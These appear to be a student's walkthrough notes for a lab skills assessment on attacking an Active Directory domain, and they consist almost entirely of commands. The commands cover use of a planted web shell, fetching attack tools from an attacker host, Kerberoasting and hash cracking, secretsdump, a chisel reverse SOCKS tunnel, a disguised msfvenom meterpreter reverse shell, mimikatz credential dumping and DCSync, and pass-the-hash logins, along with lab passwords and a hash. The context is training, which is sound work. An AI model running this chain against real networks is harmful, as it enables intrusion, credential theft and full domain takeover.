### AD Enumeration & Attacks - Skills Assessment Part I

```
# Target(s): c (ACADEMY-EA-WEB01-SA1)

# password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) 
# in place for us to start from in the /uploads directory

# http://10.129.158.99/uploads/antak.aspx and login with the credential admin:My_W3bsH3ll_P@ssw0rd!

PS> type C:\Users\Administrator\Desktop\flag.txt                                       # get 1st flag

git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git              # From atck hsot
cd Ghostpack-CompiledBinaries/ 
python3 -m http.server 8080

Invoke-WebRequest -Uri "http://10.10.15.84:8080/Rubeus.exe" -OutFile ".\Rubeus.exe"    # From Web shell
.\Rubeus.exe kerberoast /nowrap                                                        # Get target acc name

hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt                         # Copy Hash and crack pass

# Oneliner to get second flag

$password = ConvertTo-SecureString 'lucky7' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential ('INLANEFREIGHT\svc_sql', $password); $s = New-PSSession -ComputerName MS01 -Credential $cred; Invoke-Command -Session $s -ScriptBlock { Get-Content C:\Users\Administrator\Desktop\flag.txt }

# Download secretdumps and grab user and plain pass for next 2 questions        

cd C:\Windows\Temp; Invoke-WebRequest -Uri "http://10.10.15.84:8080/secretsdump.exe" -OutFile ".\secretsdump.exe"
cd C:\Windows\Temp; .\secretsdump.exe INLANEFREIGHT/svc_sql:"lucky7"@172.16.6

# Gathering info for possible type of attack

cd C:\Windows\Temp; Invoke-WebRequest -Uri "http://10.10.15.84:8000/PowerView.ps1" -OutFile ".\PowerView.ps1"
cd C:\Windows\Temp; Import-Module .\PowerView.ps1; Get-DomainUser -Identity tpetty | select objectsid | fl
cd C:\Windows\Temp; Import-Module .\powerview.ps1; $sid="S-1-5-21-2270287766-1317258649-2146029398-4607"; Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ?{$_.SecurityIdentifier -match $sid}

# DC01 flag (Issues with web shell only need to inplement through additional reverse shell)

Edit /etc/proxychains.conf with socks5 127.0.0.1 1080
sudo chisel server --reverse -v -p 1234 --socks5 

cd C:\Windows\Temp; Invoke-WebRequest -Uri "http://10.10.15.84:8080/chisel.exe" -OutFile ".\chisel.exe" 
cd C:\Windows\Temp; .\chisel.exe client -v 10.10.15.84/23:1234 R:socks 

proxychains secretsdump.py INLANEFREIGHT/tpetty:"Sup3rS3cur3D0m@inU2eR"@172.16.6.3
proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0

type C:\Users\Administrator\Desktop\flag.txt




# 2nd option with payload , more easier , more interactive

# atck host
msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.15.84 -f exe -o backupscript.exe LPORT=4444

# web server host
Invoke-WebRequest -Uri "http://10.10.15.84:8080/backup.exe " -OutFile "C:\windows\system32\inetsrv\backupscript.exe"

# atck host
msfconsole
use exploit/multi/handler
set LHOST 10.10.15.84
set LPORT 4444
set payload windows/x64/meterpreter/reverse_https
run

# web server host (web-shell must fall to infinite loop loading, and we'll the meterpreter connection from atck host)
.\backupscript.exe

# web server host, meterpreter
shell
powershell.exe

# Atck host 
# Download needed tools , PV as an example
git clone https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
cd /to/folder
python3 -m http.server 8080

# web server host, meterpreter
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat 
(hashcat -m 13100 -a 0 /tmp/svc_sql_Hashe.txt /usr/share/wordlists.rockyou.txt)

# Going to MS01
ping MS01
$user = "inlanefreight\svc_sql"
$Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials

Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' }

# Next Ctrl+Z to background session (2 times MS01->Webserver->Atckhost)
sessions
sessions -i 1
portfwd add -l 1234 -p 3389 -r 172.16.6.50 

# From 2nd atckhost session
xfreerdp /v:localhost:1234 /u:"inlanefreight\svc_sql" /p:lucky7 /dynamic-resolution /drive:Shared,/path/to/tools


# MS01 RDP
Move-Item -Path "\\tsclient\Shared\mimikatz.exe" -Destination "C:\Users\svc_sql\Desktop\"

./mimikatz.exe 
privilege::debug 
sekurlsa::logonpasswords

Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential

     
privilege::debug 
sekurlsa::logonpasswords

$sid= Convert-NameToSid tpetty
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

# Start DCsync on MS01   (with prev got pass Sup3rS3cur3D0m@inU2eR)
runas /user:inlanefreight.local\tpetty powershell 

Move-Item -Path "\\tsclient\Shared\mimikatz.exe" -Destination "C:\Users\tpetty\Desktop\"

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

ping DC01            # easy check for IP (172.16.6.3)


# Back on 2nd atck host sessions, add new port forward to DC01
portfwd add -l 9999 -p 5985 -r 172.16.6.3
portfwd list

evil-winrm -i localhost --port 9999 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
type C:\Users\Administrator\Desktop\flag.txt
```

    

### AD Enumeration & Attacks - Skills Assessment Part II
